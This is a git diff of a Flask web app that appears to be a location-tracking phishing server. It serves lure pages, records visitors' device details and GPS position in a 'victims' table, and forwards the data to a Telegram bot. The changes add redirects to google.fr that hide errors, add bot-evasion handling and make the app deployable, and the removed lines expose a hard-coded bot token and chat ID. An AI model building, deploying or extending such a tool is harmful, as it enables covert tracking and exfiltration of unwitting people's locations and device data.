@@ -8,12 +8,19 @@ import re
 from flask import Flask, render_template, request, jsonify, send_from_directory, Response, redirect
 from functools import wraps
 import telegram_api
+from werkzeug.middleware.proxy_fix import ProxyFix
 
 app = Flask(__name__, template_folder='flask_templates', static_folder='template')
-app.config['SECRET_KEY'] = os.urandom(24)
+app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
+app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24))
 
 # =============== DATABASE SETUP ===============
-DB_FILE = 'geopol.db'
+RAILWAY_VOLUME_PATH = os.environ.get('RAILWAY_VOLUME_MOUNT_PATH', '')
+if RAILWAY_VOLUME_PATH:
+    DB_FILE = os.path.join(RAILWAY_VOLUME_PATH, 'geopol.db')
+else:
+    DB_FILE = 'geopol.db'
+
 def init_db():
     with sqlite3.connect(DB_FILE) as conn:
         conn.execute('''CREATE TABLE IF NOT EXISTS victims
@@ -66,12 +73,19 @@ def requires_auth(f):
     return decorated
 
 # =============== TELEGRAM SETUP ===============
-TG_TOKEN = os.environ.get('TG_TOKEN', '7577087488:AAG2KstzvMwoOaD_a_3ifx9-6ERujVpwxaE')
-CHAT_ID = os.environ.get('CHAT_ID', '858142517')
+TG_TOKEN = os.environ.get('TG_TOKEN', '')
+CHAT_ID = os.environ.get('CHAT_ID', '')
 
-# Format pour la rétrocompatibilité avec telegram_api.py
-token_parts = TG_TOKEN.split(':')
-TELEGRAM_TOKEN = [token_parts[0], token_parts[1], CHAT_ID]
+if TG_TOKEN and CHAT_ID:
+    # Format pour la rétrocompatibilité avec telegram_api.py
+    token_parts = TG_TOKEN.split(':')
+    if len(token_parts) >= 2:
+        TELEGRAM_TOKEN = [token_parts[0], token_parts[1], CHAT_ID]
+    else:
+        TELEGRAM_TOKEN = ["", "", ""]
+else:
+    print("WARNING: OS Variables TG_TOKEN or CHAT_ID are missing. Operating in offline mode.")
+    TELEGRAM_TOKEN = ["", "", ""]
 
 def send_tg(data, msg_type):
     try:
@@ -280,7 +294,15 @@ def serve_target(tpl_name):
                 
             return content
     except Exception as e:
-        return f"Error loading template: {str(e)}", 404
+        return redirect("https://www.google.fr")
+
+@app.errorhandler(404)
+def page_not_found(e):
+    return redirect("https://www.google.fr")
+
+@app.errorhandler(500)
+def internal_error(e):
+    return redirect("https://www.google.fr")
 
 @app.route('/t/<tpl_name>/<path:filename>')
 def serve_tpl_assets(tpl_name, filename):
@@ -296,7 +318,7 @@ def info_handler(tpl_name):
     if is_bot(request) or is_bot(request.form.get('Brw', '')):
         return "OK"
         
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(',')[0].strip()
+    ip = request.remote_addr
     dev_info = {
         'os': request.form.get('Os', ''),
         'platform': request.form.get('Ptf', ''),
@@ -389,7 +411,7 @@ def result_handler(tpl_name):
         'dir': request.form.get('Dir', ''),
         'spd': request.form.get('Spd', '')
     }
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(',')[0].strip()
+    ip = request.remote_addr
     send_tg(loc_info, 'location')
     
     with sqlite3.connect(DB_FILE) as conn:
@@ -413,7 +435,7 @@ def error_handler(tpl_name):
         'status': request.form.get('Status', ''),
         'error': request.form.get('Error', '')
     }
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(',')[0].strip()
+    ip = request.remote_addr
     send_tg(err_info, 'error')
     
     with sqlite3.connect(DB_FILE) as conn:
